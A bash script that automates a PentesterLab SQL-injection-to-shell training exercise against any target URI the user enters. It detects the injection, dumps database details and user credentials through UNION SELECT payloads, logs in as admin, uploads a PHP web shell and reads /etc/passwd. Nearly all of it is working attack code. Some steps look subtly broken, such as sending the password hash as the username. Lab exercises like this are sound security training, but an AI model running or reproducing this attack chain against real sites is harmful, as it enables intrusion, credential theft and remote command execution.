#!/bin/bash

# Automated Exploit for
# "From SQL injection to shell" exercise - https://www.pentesterlab.com
# 0xEval - (@0xEval)

echo ""
echo "███████╗ ██████╗ ██╗     ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗"
echo "██╔════╝██╔═══██╗██║     ╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║"
echo "███████╗██║   ██║██║      █████╔╝███████╗███████║█████╗  ██║     ██║"
echo "╚════██║██║▄▄ ██║██║     ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║"
echo "███████║╚██████╔╝███████╗███████╗███████║██║  ██║███████╗███████╗███████╗"
echo "╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝"
echo ""
echo ""

# Payloads
db_info="database(),0x3a,version(),0x3a,user()"
db_creds="login,0x3a,password"
web_shell="<?php system(\$_GET['cmd']); ?>"

echo "Enter the URI of the target"
read -p '> http://' target
target="http://$target"

echo ""
echo "[+] Searching for SQLi vulnerability..."
payload="$target/cat.php?id=1{'}"
vulnerable=$(curl -s "$payload" | grep -i 'error')
if [ -z "$vulnerable" ]; then
    echo "[x] No vulnerability found... Whoops !"
    exit -1
else
    echo "[+] Target seems to be vulnerable !"
fi

echo ""
echo "[+] Dumping Database information..."

sqli=" UNION SELECT 1,concat($db_info),3,4"
payload="$target/cat.php?id=0{$sqli}"
infos=$(curl -s "$payload" | grep -oP '^Picture:\s*\K.*' | tr -d ' ')

IFS=':' read -r -a info_array <<< "$infos"
echo "  [*] Database Name    : ${info_array[0]}"
echo "  [*] Database User    : ${info_array[1]}"
echo "  [*] Database Version : ${info_array[2]}"

echo ""
echo "[+] Dumping Database credentials ..."

sqli=" UNION SELECT 1,concat($db_creds),3,4 FROM users"
payload="$target/cat.php?id=0{$sqli}"
creds=$(curl -s "$payload" | grep -oP '^Picture:\s*\K.*' | tr -d ' ')

IFS=':' read -r -a cred_array <<< "$creds"
echo "  [*] Username      : ${cred_array[0]}"
echo "  [*] Password Hash : ${cred_array[1]}"

echo ""
echo "[+] Accessing Administration Page..."
login="${cred_array[1]}"
password="P4ssw0rd" # Courtesy of CrackStation (too lazy to use John)
echo "  [*] Password Hash    : $login"
echo "  [*] Cracked Password : $password"

payload="$target/admin/login.php"
request=$(curl -s -X POST "$payload" -d "user=$login&password=$password")

if [[ $request == *"200 OK"* ]]; then
    echo "  [*] Login Successful !"
else
    echo "  [x] Login Failed... Aborting."
    exit -1
fi

echo ""
echo "[+] Uploading Web Shell..."
echo "$web_shell" > web_shell.php3

payload="$target/admin/index.php"
request=$(curl -s -X POST "$payload" -d "title=shell&image=$web_shell&category=1&Add=Add")

if [[ $request == *"200 OK"* ]]; then
    echo "  [*] Upload Successful !"
else
    echo "  [x] Upload Failed ... Aborting."
    exit -1
fi

echo ""
echo "[+] OOOOOOOOoooooooooohh baby !"

payload="$target/admin/uploads/web_shell.php3?cmd=cat /etc/passwd"
request=$(curl -s "$payload")
echo "  [*] Saving /etc/passwd to passwd_dump"
echo "$request" > passwd_dump